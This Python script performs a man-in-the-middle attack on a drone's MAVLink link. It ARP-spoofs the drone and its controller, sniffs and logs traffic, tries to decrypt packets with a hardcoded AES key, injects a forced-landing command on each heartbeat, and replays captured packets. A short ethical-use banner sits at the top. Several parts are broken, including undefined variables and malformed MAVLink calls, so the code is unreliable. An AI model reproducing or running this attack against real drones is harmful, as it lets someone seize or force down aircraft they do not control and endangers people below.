from scapy.all import *
from pymavlink import mavutil
import threading
import time
import sys
import os
import json
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import binascii
import ipaddress

# Display ethical use reminder
print("Advanced MITM Attack Simulation for Drone Research")
print("Use only on your own equipment or with explicit permission. Unauthorized attacks are illegal.")

# Function to validate IP addresses
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Prompt user for IP addresses with validation
while True:
    drone_ip = input("Enter the drone's IP address: ")
    if is_valid_ip(drone_ip):
        break
    print("Invalid IP address. Please try again.")

while True:
    controller_ip = input("Enter the controller's IP address: ")
    if is_valid_ip(controller_ip):
        break
    print("Invalid IP address. Please try again.")

while True:
    attacker_ip = input("Enter the attacker's IP address: ")
    if is_valid_ip(attacker_ip):
        break
    print("Invalid IP address. Please try again.")

# Prompt for network interface (no validation applied)
interface = input("Enter the network interface (e.g., wlan0): ")

# Configuration
mavlink_port = 14550  # MAVLink UDP port
log_file = "mitm_log.json"  # Log file for intercepted data
spoof_interval = 5  # Seconds between ARP spoof packets

# Global variables
captured_packets = []
stop_event = threading.Event()

# Enable IP forwarding
def enable_ip_forwarding():
    print("[+] Enabling IP forwarding...")
    os.system("sysctl -w net.ipv4.ip_forward=1")

# ARP spoofing function
def arp_spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    spoof_mac = getmacbyip(spoof_ip)
    if not target_mac or not spoof_mac:
        print(f"Error: Could not resolve MAC addresses for {target_ip} or {spoof_ip}.")
        sys.exit(1)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, verbose=0)

# Continuous ARP spoofing
def continuous_arp_spoof():
    while not stop_event.is_set():
        arp_spoof(drone_ip, controller_ip)
        arp_spoof(controller_ip, drone_ip)
        time.sleep(spoof_interval)

# Detect potential encryption (simplified heuristic)
def is_encrypted(raw_data):
    return len(set(raw_data)) > 128

# Attempt decryption (basic example)
def attempt_decrypt(raw_data, key=b'16bytekey1234567'):
    try:
        cipher = Cipher(algorithms.AES(key), modes.ECB())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(raw_data) + decryptor.finalize()
        return decrypted
    except Exception:
        return None

# Parse and handle MAVLink packets
def handle_mavlink(packet):
    if packet.haslayer(UDP) and packet[UDP].dport == mavlink_port:
        raw_data = bytes(packet[UDP].payload)
        log_packet(packet, raw_data)
        if is_encrypted(raw_data):
            print("[!] Encrypted traffic detected. Attempting decryption...")
            decrypted = attempt_decrypt(raw_data)
            if decrypted:
                raw_data = decrypted
            else:
                print("[-] Decryption failed. Proceeding with raw data.")

        try:
            mav_msg = mavutil.mavlink_connection('udp:', mav.parse_buffer(raw_data))
            if mav_msg:
                for msg in mav_msg:
                    print(f"[+] Intercepted: {msg}")
                    # Example dynamic injection
                    if msg.get_type() == "HEARTBEAT":
                        print("[+] Heartbeat detected. Injecting fake command...")
                        inject_command(mavutil.mavlink.MAV_CMD_NAV_LAND)
        except Exception as e:
            print(f"[-] Error parsing MAVLink: {e}")

# Inject a MAVLink command
def inject_command(command_id):
    mav = mavutil.mavlink_connection('udp:', source_system=1)
    mav.mav.command_long_send(
        1, 1, target_system, target_component,
        command_id,
        0, 0, 0, 0, 0, 0, 0  # Parameters
    )
    packet = IP(dst=controller_ip) / UDP(dport=mavlink_port) / Raw(mav.mav.encode())
    send(packet, verbose=0)
    print(f"[+] Injected command: {command_id}")

# Replay packets
def replay_packets():
    while not stop_event.is_set():
        if captured_packets:
            packet = captured_packets[-1]
            send(packet, verbose=0)
            print("[+] Replayed packet.")
        time.sleep(10)

# Log packets to a JSON file
def log_packet(packet, raw_data):
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'src_ip': packet[IP].src,
        'dst_ip': packet[IP].dst,
        'raw_data': binascii.hexlify(raw_data).decode('ascii'),
    }
    captured_packets.append(packet)
    with open(log_file, 'a') as f:
        json.dump(log_entry, f)
        f.write('\n')

# Sniff and process packets
def sniff_packets():
    sniff(iface=interface, prn=handle_mavlink, filter=f"udp and port {mavlink_port}", store=0,
          stop_filter=lambda x: stop_event.is_set())

# Main execution
if __name__ == "__main__":
    enable_ip_forwarding()
    spoof_thread = threading.Thread(target=continuous_arp_spoof)
    spoof_thread.daemon = True
    spoof_thread.start()

    replay_thread = threading.Thread(target=replay_packets)
    replay_thread.daemon = True
    replay_thread.start()

    print("[+] Starting advanced MITM attack... Press Ctrl+C to stop.")
    try:
        sniff_packets()
    except KeyboardInterrupt:
        print("\n[+] Stopping MITM attack...")
        stop_event.set()
        sys.exit(0)
